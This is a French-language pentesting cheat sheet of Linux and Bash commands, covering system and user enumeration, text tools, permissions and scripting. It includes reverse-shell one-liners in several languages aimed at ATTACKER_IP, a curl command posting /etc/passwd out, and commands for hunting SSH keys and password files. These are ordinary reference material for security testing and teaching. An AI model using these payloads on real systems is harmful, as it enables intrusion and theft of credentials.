# 🐧 Commandes Linux et Bash — fiche complète pour les tests d’intrusion

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

## 📋 Table des matières

- [Navigation et fichiers](#-navigation-et-fichiers)
- [Énumération du système](#-énumération-du-système)
- [Énumération des utilisateurs](#-énumération-des-utilisateurs)
- [Commandes réseau](#-commandes-réseau)
- [Recherche et analyse de fichiers](#-recherche-et-analyse-de-fichiers)
- [Traitement de texte](#-traitement-de-texte)
- [Permissions et propriétaires](#-permissions-et-propriétaires)
- [Gestion des processus](#-gestion-des-processus)
- [Gestion des paquets](#-gestion-des-paquets)
- [Scripts Bash](#-scripts-bash)
- [Connexions shell inversées (reverse shells)](#-connexions-shell-inversées-reverse-shells)
- [Transferts de fichiers](#-transferts-de-fichiers)
- [Commandes en une ligne](#-commandes-en-une-ligne)

---

## 📁 Navigation et fichiers

### Navigation dans les répertoires

```bash
# Répertoire courant
pwd

# Changer de répertoire
cd /path/to/dir
cd ..          # Répertoire parent
cd ~           # Répertoire personnel
cd -           # Répertoire précédent

# Lister les fichiers
ls
ls -la         # Format détaillé, tous les fichiers
ls -lah        # Tailles lisibles par un humain
ls -latr       # Tri chronologique inversé
ll             # Alias de ls -la (selon la distribution)
```

### Opérations sur les fichiers

```bash
# Créer des fichiers et des répertoires
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Créer les répertoires parents

# Copier
cp source dest
cp -r source_dir dest_dir  # Récursif

# Déplacer ou renommer
mv source dest
mv oldname newname

# Supprimer
rm file
rm -r directory            # Récursif
rm -rf directory           # Forcer, sans confirmation

# Afficher les fichiers
cat file.txt
less file.txt              # Visualiseur paginé
more file.txt
head -n 20 file.txt        # 20 premières lignes
tail -n 20 file.txt        # 20 dernières lignes
tail -f file.txt           # Suivre les ajouts en direct
```

### Archives et compression

```bash
# tar
tar -cvf archive.tar files/      # Créer
tar -xvf archive.tar             # Extraire
tar -czvf archive.tar.gz files/  # Créer une archive compressée avec gzip
tar -xzvf archive.tar.gz         # Extraire une archive compressée avec gzip

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

## 🔍 Énumération du système

### Informations système

```bash
# Nom d’hôte
hostname
hostname -I               # Adresses IP

# Système d’exploitation et noyau
uname -a                  # Toutes les informations
uname -r                  # Version du noyau
cat /etc/os-release       # Informations sur le système
cat /etc/issue            # Bannière du système
cat /proc/version         # Informations sur le noyau et le compilateur

# Architecture
arch
uname -m

# Matériel
lscpu                     # Informations sur le processeur
cat /proc/cpuinfo
free -h                   # Mémoire
df -h                     # Espace disque
lsblk                     # Périphériques de stockage par blocs
```

### Environnement

```bash
# Variables d’environnement
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Définir une variable
export VAR="value"
VAR="value"
```

### Services en cours d’exécution

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Vérifier les ports en écoute
ss -tulpn
netstat -tulpn
```

### Tâches cron

```bash
# Crontab de l’utilisateur
crontab -l

# Crontabs du système
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Observer les tâches cron avec pspy
./pspy64
```

### Paquets installés

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Rechercher un paquet
dpkg -l | grep package
which binary
whereis binary
```

---

## 👤 Énumération des utilisateurs

### Utilisateur courant

```bash
# Identifier l’utilisateur courant
whoami
id
id username

# Groupes
groups
groups username

# Privilèges
sudo -l                   # Autorisations sudo
cat /etc/sudoers          # Fichier sudoers (nécessite root)
```

### Tous les utilisateurs

```bash
# Liste des utilisateurs
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Utilisateurs disposant d’un shell
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Empreintes des mots de passe (nécessite root)
cat /etc/shadow

# Connexions récentes
last
lastlog
w
who
users
```

### Fichiers intéressants

```bash
# Clés SSH
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Historique
cat ~/.bash_history
cat ~/.zsh_history
history

# Fichiers de configuration
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

## 🌐 Commandes réseau

### Configuration réseau

```bash
# Adresse IP
ip a
ip addr show
ifconfig

# Routes
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Table ARP
arp -a
ip neigh
```

### Ports ouverts et connexions

```bash
# Ports en écoute
ss -tulpn
ss -tlnp                  # TCP uniquement
netstat -tulpn
netstat -ano

# Connexions actives
ss -tup
netstat -an | grep ESTABLISHED

# Trouver le processus associé à un port
lsof -i :80
fuser 80/tcp
```

### Tests réseau

```bash
# Ping
ping -c 4 host

# Traceroute
traceroute host
tracepath host

# Résolution DNS
host domain.com
dig domain.com
nslookup domain.com

# Vérifier un port
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # En-têtes uniquement
curl -s http://host       # Mode silencieux
curl -k https://host      # Désactiver la vérification du certificat TLS
wget http://host/file
```

### Pare-feu

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

## 🔎 Recherche et analyse de fichiers

### Commande find

```bash
# Rechercher par nom
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Sans distinction de casse

# Rechercher par type
find / -type f -name "*.conf"          # Fichiers
find / -type d -name "backup"          # Répertoires

# Rechercher par permissions
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # Accessible en écriture à tous

# Rechercher par propriétaire
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Rechercher par taille
find / -size +100M 2>/dev/null         # Plus de 100 Mo
find / -size -1k 2>/dev/null           # Moins de 1 Ko

# Rechercher par date
find / -mtime -7 2>/dev/null           # Modifié au cours des 7 derniers jours
find / -atime +30 2>/dev/null          # Dernier accès il y a plus de 30 jours

# Rechercher puis exécuter
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### Grep : recherche dans les fichiers

```bash
# Recherche simple
grep "pattern" file
grep -i "pattern" file                 # Sans distinction de casse
grep -r "pattern" /path/               # Récursif
grep -rn "pattern" /path/              # Avec les numéros de ligne

# Inverser la sélection
grep -v "pattern" file                 # Lignes ne correspondant PAS au motif

# Compter les correspondances
grep -c "pattern" file

# Afficher le contexte
grep -A 3 "pattern" file               # 3 lignes après
grep -B 3 "pattern" file               # 3 lignes avant
grep -C 3 "pattern" file               # 3 lignes de chaque côté

# Expression régulière
grep -E "regex" file                   # Expression régulière étendue
egrep "regex" file

# Plusieurs motifs
grep -E "pattern1|pattern2" file
```

### Locate et Which

```bash
# Locate (nécessite updatedb)
locate filename
updatedb                               # Mettre à jour la base de données

# Which (trouver un exécutable)
which binary
whereis binary
type command
```

### Analyse de fichiers

```bash
# Type de fichier
file filename

# Chaînes de caractères d’un binaire
strings binary
strings binary | grep password

# Affichage hexadécimal
xxd file
hexdump -C file

# Empreinte
md5sum file
sha256sum file
sha1sum file
```

---

<a id="-traitement-de-texte"></a>
## ✂️ Traitement de texte

### Cut

```bash
# Découper selon un séparateur
cut -d: -f1 /etc/passwd                # Premier champ, séparateur :
cut -d: -f1,3 /etc/passwd              # Champs 1 et 3

# Découper selon la position des caractères
cut -c1-10 file                        # Caractères 1 à 10
```

### Awk

> **Précision :** l’exemple `awk '$3 > 1000' /etc/passwd` ne définit pas le séparateur `:` nécessaire pour traiter les champs de ce fichier. Par défaut, awk sépare les champs sur les espaces blancs ; voir le [manuel GNU awk](https://www.gnu.org/software/gawk/manual/html_node/Default-Field-Splitting.html). La commande source est conservée.

```bash
# Afficher des colonnes
awk '{print $1}' file                  # Première colonne
awk '{print $1, $3}' file              # Colonnes 1 et 3
awk -F: '{print $1}' /etc/passwd       # Séparateur personnalisé

# Conditions
awk '$3 > 1000' /etc/passwd            # Lorsque le champ 3 est supérieur à 1000
awk '/pattern/ {print $1}' file        # Lignes correspondantes

# Variables intégrées
awk '{print NR, $0}' file              # Numéros de ligne
awk 'END {print NR}' file              # Nombre total de lignes
```

### Sed

```bash
# Remplacer
sed 's/old/new/' file                  # Première occurrence
sed 's/old/new/g' file                 # Toutes les occurrences
sed -i 's/old/new/g' file              # Modifier le fichier sur place

# Supprimer des lignes
sed '/pattern/d' file                  # Supprimer les lignes correspondantes
sed '5d' file                          # Supprimer la ligne 5
sed '1,5d' file                        # Supprimer les lignes 1 à 5

# Afficher des lignes précises
sed -n '5p' file                       # Afficher la ligne 5
sed -n '1,10p' file                    # Afficher les lignes 1 à 10
```

### Sort et Uniq

```bash
# Trier
sort file
sort -r file                           # Ordre inverse
sort -n file                           # Numérique
sort -u file                           # Valeurs uniques uniquement
sort -t: -k3 -n /etc/passwd            # Selon le champ 3

# Unicité
uniq file                              # Supprimer les doublons adjacents
sort file | uniq                       # Supprimer tous les doublons
uniq -c file                           # Compter les occurrences
sort file | uniq -c | sort -rn         # Compter et trier
```

### Autres commandes utiles

```bash
# Compter le contenu
wc -l file                             # Lignes
wc -w file                             # Mots
wc -c file                             # Octets

# Mise en forme en colonnes
column -t file                         # Aligner en colonnes
column -s: -t /etc/passwd              # Séparateur personnalisé

# tr (transformer les caractères)
echo "HELLO" | tr 'A-Z' 'a-z'          # Convertir en minuscules
cat file | tr -d '\n'                  # Supprimer les sauts de ligne

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

## 🔐 Permissions et propriétaires

### Comprendre les permissions

Dans le schéma source conservé ci-dessous, **Others** désigne les autres utilisateurs, **Group** le groupe et **Owner** le propriétaire ; **File type** indique le type de fichier.

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Others (r-x = 5)
│ │  └───── Group  (r-x = 5)
│ └──────── Owner  (rwx = 7)
└────────── File type (- = file, d = directory)
```

### Chmod

```bash
# Numérique
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Symbolique
chmod +x file                          # Ajouter le droit d’exécution
chmod -w file                          # Retirer le droit d’écriture
chmod u+x file                         # Droit d’exécution du propriétaire
chmod g+w file                         # Droit d’écriture du groupe
chmod o-r file                         # Retirer la lecture aux autres utilisateurs

# Récursif
chmod -R 755 directory/
```

### Chown

```bash
# Changer le propriétaire
chown user file
chown user:group file
chown -R user:group directory/

# Changer uniquement le groupe
chgrp group file
```

### Permissions spéciales

```bash
# SUID (Set User ID) - 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID) - 2
chmod g+s directory
chmod 2755 directory

# Sticky bit - 1
chmod +t directory
chmod 1755 directory

# Rechercher SUID et SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a id="-gestion-des-processus"></a>
## ⚙️ Gestion des processus

### Afficher les processus

```bash
# Lister les processus
ps aux
ps -ef
ps aux | grep process_name

# Top (affichage en direct)
top
htop                                   # Version améliorée

# Arbre des processus
pstree
ps auxf
```

### Contrôler les processus

```bash
# Arrière-plan et premier plan
command &                              # Exécuter en arrière-plan
Ctrl+Z                                 # Suspendre
bg                                     # Reprendre en arrière-plan
fg                                     # Ramener au premier plan
jobs                                   # Lister les tâches du shell

# Terminer un processus
kill PID
kill -9 PID                            # Forcer l’arrêt
killall process_name
pkill process_name

# Nice (priorité)
nice -n 10 command                     # Priorité réduite
renice 10 -p PID
```

---

## 📦 Gestion des paquets

### Debian/Ubuntu (apt/dpkg)

```bash
# Mettre à jour
apt update
apt upgrade

# Installer
apt install package
dpkg -i package.deb

# Désinstaller
apt remove package
apt purge package                      # Supprimer aussi la configuration

# Rechercher
apt search package
apt-cache search package

# Informations
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Mettre à jour
yum update
dnf update

# Installer
yum install package
dnf install package

# Désinstaller
yum remove package

# Rechercher
yum search package

# Informations
yum info package
rpm -qa | grep package
```

---

## 💻 Scripts Bash

### Bases

```bash
#!/bin/bash

# Variables
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Substitution de commande
DATE=$(date)
FILES=`ls -la`

# Lire une saisie
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### Conditions

> **Précision :** les lignes de comparaison ci-dessous illustrent des tests isolés : ce ne sont pas des scripts complets. Chaque construction `if` doit avoir son corps et sa clôture `fi`, comme décrit dans le [manuel Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html). Les chaînes affichées par les exemples restent en anglais pour préserver les valeurs du code.

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Comparaisons de chaînes
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Vide
if [ -n "$str" ]; then                 # Non vide

# Comparaisons numériques
if [ $num1 -eq $num2 ]; then           # Égal
if [ $num1 -ne $num2 ]; then           # Différent
if [ $num1 -gt $num2 ]; then           # Supérieur à
if [ $num1 -lt $num2 ]; then           # Inférieur à

# Tests sur les fichiers
if [ -e file ]; then                   # Existe
if [ -f file ]; then                   # Est un fichier
if [ -d dir ]; then                    # Est un répertoire
if [ -r file ]; then                   # Accessible en lecture
if [ -w file ]; then                   # Accessible en écriture
if [ -x file ]; then                   # Exécutable
```

### Boucles

```bash
# Boucle for
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# Boucle while
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# Boucle for de style C
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Fonctions

```bash
# Définir une fonction
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Appeler la fonction
function_name arg1 arg2
```

### Exemple de script

```bash
#!/bin/bash
# Analyseur de ports

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

## 🔌 Connexions shell inversées (reverse shells)

### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

> **Compatibilité :** les options disponibles varient selon l’implémentation de netcat ; `-e` n’est pas universel. Consultez notamment le [manuel netcat d’OpenBSD](https://man.openbsd.org/nc) et l’aide de la version installée. Les exemples Python 2 sont historiques et les fonctions `/dev/tcp` dépendent du shell.

```bash
# nc avec -e
nc -e /bin/bash ATTACKER_IP PORT

# nc sans -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Améliorer le shell

```bash
# Créer un pseudo-terminal
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# Terminal interactif complet
# Dans le shell inversé :
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# Sur la machine de test :
stty raw -echo; fg
# Dans le shell :
export TERM=xterm
stty rows 40 cols 150
```

---

<a id="-transferts-de-fichiers"></a>
## ⬇️ Transferts de fichiers

### De la machine de test vers la cible

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Machine de test : nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (pour les petits fichiers)
# Machine de test : base64 file
echo "BASE64_STRING" | base64 -d > file
```

### De la cible vers la machine de test

```bash
# nc
# Machine de test : nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Copier la sortie sur la machine de test et la décoder
```

### Démarrer un serveur HTTP

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

## ⚡ Commandes en une ligne

### Commandes utiles pour les tests d’intrusion

> **Précisions :** la regex d’extraction d’IP est un filtre de forme, pas une validation des octets entre 0 et 255. L’exemple de décodage d’URL repose sur la lecture des paires hexadécimales par `xxd`, qui ignore les autres caractères ; il ne constitue pas un décodeur général des URL mêlant caractères bruts et échappés. Voir le [manuel officiel de xxd](https://github.com/vim/vim/blob/master/runtime/doc/xxd.1). Les lignes sources sont conservées.

```bash
# Rechercher les binaires SUID
find / -perm -4000 -type f 2>/dev/null

# Rechercher les répertoires accessibles en écriture
find / -writable -type d 2>/dev/null

# Rechercher les fichiers accessibles en écriture à tous
find / -perm -o+w -type f 2>/dev/null

# Rechercher les fichiers de configuration contenant des mots de passe
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# Rechercher les clés SSH
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Analyse rapide des ports
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Découverte des hôtes par ping
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Extraire les adresses IP d’un fichier
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Encodage et décodage Base64
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# Encodage et décodage d’URL
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Tableau de référence rapide

| Utilité | Commande |
|---------|---------|
| Utilisateur courant | `whoami` / `id` |
| Informations système | `uname -a` |
| Adresse IP | `ip a` / `hostname -I` |
| Ports ouverts | `ss -tulpn` |
| Processus en cours | `ps aux` |
| Rechercher SUID | `find / -perm -4000 2>/dev/null` |
| Répertoires accessibles en écriture | `find / -writable -type d 2>/dev/null` |
| Télécharger un fichier | `wget http://url/file` |
| Shell inversé | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Améliorer le terminal | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 Ressources

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Fiche pratique des shells inversés](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Fiches connexes
- [Élévation de privilèges Linux](../../Linux-PrivEsc/README.md)
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/translations/README.fr.md)

---

<p align="center">
  <b>🐧 Maîtrisez Linux pour les tests d’intrusion !</b><br>
  <i>La ligne de commande est votre meilleure alliée</i>
</p>
